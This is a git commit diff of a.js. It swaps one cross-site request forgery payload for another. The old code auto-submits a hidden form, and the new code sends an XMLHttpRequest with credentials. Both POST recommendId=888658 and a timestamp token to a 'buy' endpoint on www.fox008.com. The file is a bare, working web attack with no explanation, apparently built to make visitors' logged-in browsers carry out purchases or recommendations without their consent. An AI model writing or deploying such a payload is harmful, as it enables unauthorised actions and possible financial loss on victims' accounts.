939493cbeb9cea7a72fd394e9ba20d10a7da92da
fashao <ufo@cs229.com>
2016-08-11 14:15:08 +0800

    js

--- a.js
+++ a.js
@@ -1,28 +1,21 @@
 <script>
-function new_form(){
-    var f = document.createElement("form");
-    document.body.appendChild(f);
-    f.method = "post";
-    return f;
-}
-function create_elements(eForm,eName,eValue){
-    var e=document.createElement("input");
-    eForm.appendChild(e);
-    e.type='text';
-    e.name=eName;
-    if(!document.all){
-        e.style.display='none';
-    }else{
-        e.style.display='block';
-        e.style.width='0px';
-        e.style.height='0px';
+var xmlhttp;
+if (window.XMLHttpRequest)
+  {// code for IE7+, Firefox, Chrome, Opera, Safari
+  xmlhttp=new XMLHttpRequest();
+  }
+else
+  {// code for IE6, IE5
+  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+  }
+xmlhttp.onreadystatechange=function()
+  {
+  if (xmlhttp.readyState==4 && xmlhttp.status==200)
+    {
+    document.getElementById("myDiv").innerHTML=xmlhttp.responseText;
     }
-    e.value=eValue;
-    return e;
-}
-var _f=new_form();
-create_elements(_f,"recommendId","888658");
-create_elements(_f,"request_token",String(new Date().getTime()));
-_f.action="http://www.fox008.com/YP/recommend/buy?t="+String(new Date().getTime());
-_f.submit();
+  }
+xmlhttp.withCredentials = true;
+xmlhttp.open("POST","http://www.fox008.com/YP/recommend/buy?t="+String(new Date().getTime())+"&recommendId=888658&request_token="+String(new Date().getTime()),true);
+xmlhttp.send("recommendId=888658&request_token="+String(new Date().getTime()));
 </script>
